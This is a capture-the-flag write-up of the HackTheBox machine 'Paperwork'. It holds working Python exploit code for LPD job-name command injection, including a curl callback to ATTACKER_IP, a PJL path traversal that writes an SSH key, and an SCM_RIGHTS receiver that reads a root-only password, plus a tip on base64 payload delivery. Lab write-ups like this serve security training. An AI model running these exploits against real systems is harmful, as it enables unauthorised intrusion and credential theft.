---
title: "HTB - Paperwork"
date: 2026-07-12
tags: ["HackTheBox","Linux","Easy","Seasonal","LPD","PJL","PathTraversal","SCM_RIGHTS","PrivilegeEscalation","PrinterHacking"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Paperwork.png"
---

| Field | Value |
|-------|-------|
| Machine | Paperwork |
| Difficulty | Easy |
| OS | Linux |
| Category | Seasonal |
| Attack Path | LPD Command Injection -> PJL Path Traversal -> SSH Key Write -> SCM_RIGHTS FD Leak |
| User Flag | `<redacted>` |
| Root Flag | `<redacted>` |

---

## Summary

Paperwork is an Easy Linux seasonal box built entirely around old-school printing protocols. The entry point is a Line Printer Daemon on port 1515 that passes the job name field straight into a shell, giving command injection as the `lp` user. From there an internal PJL/JetDirect emulator on `127.0.0.1:9100` exposes a virtual filesystem with a path traversal bug, which is used to write an SSH key into archivist's home. Root comes from a custom `paperwork-daemon` that leaks a file descriptor for a root-only config over a Unix socket using SCM_RIGHTS, handing out the admin password.

---

## Reconnaissance

### Port Scan

A quick nmap scan reveals two open ports:

```bash
nmap -sC -sV -p- 10.129.49.219
```

**Open Ports:**
- **22/tcp** - SSH (OpenSSH)
- **1515/tcp** - LPD (Line Printer Daemon)

Port 1515 is unusual. The Line Printer Daemon protocol is an old Unix printing protocol that accepts print jobs over TCP. This immediately stands out as the entry point.

Additionally, there is an internal service on **127.0.0.1:9100** (PJL/JetDirect printer emulation) that is not exposed externally but plays a critical role in the chain.

---

## Foothold - LPD Command Injection (lp user)

### Understanding the LPD Protocol

LPD on port 1515 accepts print jobs with metadata fields including a job name. The service does not sanitize the job name field before passing it to a shell command internally. This gives us command injection.

### Exploitation

The injection pattern is:

```
'; <command>; #
```

This breaks out of the quoted string context, executes our command, and comments out the rest.

**Testing with a callback:**

```bash
# Start listener
nc -lvnp 9001

# Send LPD job with injected command
python3 -c "
import socket
s = socket.socket()
s.connect(('10.129.49.219', 1515))
# LPD receive-job command (0x02) for queue 'raw'
s.sendall(b'\x02raw\n')
s.recv(1024)
# Control file subcommand
ctrl = b'Hattacker\nProot\nJtest\n'
s.sendall(b'\x02' + str(len(ctrl)).encode() + b' cfA001attacker\n')
s.recv(1024)
s.sendall(ctrl + b'\x00')
s.recv(1024)
# Data file with injected job name
job_name = \"'; curl http://ATTACKER_IP:9001/pwned; #\"
data = job_name.encode()
s.sendall(b'\x03' + str(len(data)).encode() + b' dfA001attacker\n')
s.recv(1024)
s.sendall(data + b'\x00')
s.recv(1024)
s.close()
"
```

We get a callback confirming code execution as the `lp` user (uid=7).

---

## User Flag - PJL Path Traversal + SSH Key Write (archivist)

### Discovering the Internal PJL Service

From the `lp` user context, we can reach an internal JetDirect/PJL emulation service on `127.0.0.1:9100`. This is implemented by a Python script (`jetdirect.py`) that emulates an HP LaserJet 4ML.

```bash
# Via LPD injection, verify PJL service
'; echo test | nc 127.0.0.1 9100; #
```

Sending `@PJL INFO ID` returns the printer identity string confirming it responds to PJL commands.

### Path Traversal in PJL Filesystem

The PJL service implements a virtual filesystem. Looking at the `Filesystem._translate()` method in `jetdirect.py`:

```python
def _translate(self, pjl_path):
    clean = path.replace("0:", "").replace("\\", "/")
    return os.path.normpath(os.path.join(self._root, clean))
```

The root is set to a directory, but the path translation only strips the `0:` prefix and converts backslashes to forward slashes. It then uses `os.path.normpath` with `os.path.join`. The problem: if we use `0:\..\` we can traverse out of the printer's root directory and reach the filesystem.

The printer root is within the `archivist` user's space, so traversing up lands us in archivist's home directory.

### Writing SSH Authorized Keys

Using `@PJL FSDOWNLOAD` we can write arbitrary files through the path traversal. We write an SSH public key to archivist's authorized_keys:

```python
# Runs on target via LPD injection (as lp user talking to localhost:9100)
import socket, time

pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@pwn"

# PJL path traversal to archivist's .ssh/authorized_keys
path = '0:\\..\\.ssh\\authorized_keys'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 9100))

cmd = ('@PJL FSDOWNLOAD NAME="' + path + '" SIZE=' + str(len(pubkey)) + '\r\n').encode()
sock.sendall(cmd)
time.sleep(0.2)
sock.sendall(pubkey)
time.sleep(0.5)
sock.close()
```

To deliver this Python script through the LPD injection without quote mangling issues, we base64-encode it:

```bash
# Encode the Python script and deliver via LPD
echo '<base64_encoded_python_script>' | base64 -d | python3
```

### SSH as Archivist

```bash
ssh -i /tmp/.paperwork_key archivist@10.129.49.219
cat ~/user.txt
```

**User Flag: `<redacted>`**

---

## Root Flag - SCM_RIGHTS File Descriptor Leak

### Understanding paperwork-daemon

The `paperwork-daemon` binary runs as root. At startup, it:

1. Opens `/etc/paperwork/admin_pins.conf` and keeps the file descriptor open
2. Monitors the PJL log file for suspicious activity (FSQUERY, FSUPLOAD, FSDOWNLOAD keywords)
3. When it detects suspicious PJL activity, it calls `trigger_lockdown()`
4. `trigger_lockdown()` passes the open file descriptor for `admin_pins.conf` over a Unix socket at `/run/paperwork/mgmt.sock` using **SCM_RIGHTS** ancillary data

### What is SCM_RIGHTS?

SCM_RIGHTS is a mechanism in Unix domain sockets that allows one process to pass open file descriptors to another process. Even if the receiving process cannot normally open that file (due to permissions), once it receives the FD it can read from it. This is the privilege escalation vector: root passes us a readable FD to a root-only config file.

### Triggering the Lockdown

First we need to trigger the daemon's monitoring. We send a PJL command that contains one of the flagged keywords:

```python
import socket
pjl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
pjl.connect(("127.0.0.1", 9100))
pjl.sendall(b'@PJL FSUPLOAD NAME="0:\\test"\r\n')
pjl.close()
```

This writes to the PJL log which triggers `scan_for_malice()` in the daemon.

### Receiving the File Descriptor

After triggering, we connect to the management socket and receive the FD via SCM_RIGHTS:

```python
import socket, os, array, time

# Step 1: Trigger PJL log entry
pjl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
pjl.connect(("127.0.0.1", 9100))
pjl.sendall(b'@PJL FSUPLOAD NAME="0:\\test"\r\n')
time.sleep(1)
pjl.close()
time.sleep(1)

# Step 2: Connect to mgmt socket and receive FDs
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
s.settimeout(5)

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(40))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
        for fd in fds:
            os.lseek(fd, 0, os.SEEK_SET)
            data = os.read(fd, 4096).decode()
            if "ADMIN_PASSWORD=" in data:
                password = data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
                print(f"Got password: {password}")
s.close()
```

### Getting Root

The `admin_pins.conf` file contains:

```
ADMIN_PASSWORD=<redacted>
```

Using this password to switch to root:

```bash
su root
# Password: <redacted>
cat /root/root.txt
```

**Root Flag: `<redacted>`**

---

## Full Attack Chain Summary

```
Port 1515 (LPD) Command Injection
         |
         v
Code execution as 'lp' (uid=7)
         |
         v
Internal PJL service on 127.0.0.1:9100
         |
         v
PJL FSDOWNLOAD + Path Traversal (0:\..\)
         |
         v
Write SSH key to archivist's authorized_keys
         |
         v
SSH as archivist -> user.txt
         |
         v
Trigger PJL log (FSUPLOAD keyword)
         |
         v
paperwork-daemon detects "malice" -> trigger_lockdown()
         |
         v
SCM_RIGHTS passes FD for admin_pins.conf over mgmt.sock
         |
         v
Read ADMIN_PASSWORD from received FD
         |
         v
su root -> root.txt
```

---

## Key Takeaways

1. **Legacy protocols are dangerous.** LPD is ancient and rarely secured properly. Anytime you see uncommon ports, investigate the protocol implementation for injection points.

2. **Internal services expand the attack surface.** Port 9100 was not externally accessible but reachable from the compromised lp user. Always check for internal listeners after initial access.

3. **Path traversal through protocol-specific filesystems.** The PJL virtual filesystem implemented its own path handling with inadequate sanitization. Protocol emulators often have subtle filesystem bugs.

4. **SCM_RIGHTS is a real privilege escalation vector.** When a privileged process passes file descriptors to unprivileged users over Unix sockets, it effectively bypasses file permissions. This is a known but underappreciated class of vulnerability in daemon design.

5. **Script delivery matters.** Nested quoting across multiple execution layers (Python -> SSH -> bash -> Python) breaks easily. Base64 encoding your payloads avoids all quoting hell.

---

## Tools Used

- nmap (port scanning)
- Python3 (exploit scripts, socket programming)
- SSH (lateral movement)
- Custom autopwn script (full chain automation)
